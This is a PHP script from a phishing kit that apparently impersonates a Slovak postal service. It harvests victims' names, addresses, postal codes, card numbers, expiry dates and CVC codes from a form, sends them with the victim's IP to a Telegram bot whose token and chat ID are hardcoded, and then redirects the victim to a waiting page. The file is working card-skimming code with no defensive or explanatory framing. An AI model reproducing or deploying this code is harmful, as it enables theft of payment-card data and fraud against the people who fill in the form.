<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Post.sk_CVV ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + Celé : ".$_POST['Celé']."\n";
$message .= " + adresu: ".$_POST['úplnou']."\n";
$message .= " + Poštovní : ".$_POST['Poštovní']."\n";
$message .= " + CC : ".$_POST['ccnumber']."\n";
$message .= " + Fecha : ".$_POST['ccmonth']." / ".$_POST['ccyear']." - " .$_POST['cccvc']. " \n\n";
$message .= "-------------- IP Infos ------------\n";
$api = "2088425131:AAFm3EhG_BLrskQgFoXk1Z9Blyj0uG56wTc";
$chatid = "-1001555448114";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


header("Location: ././wait/");?>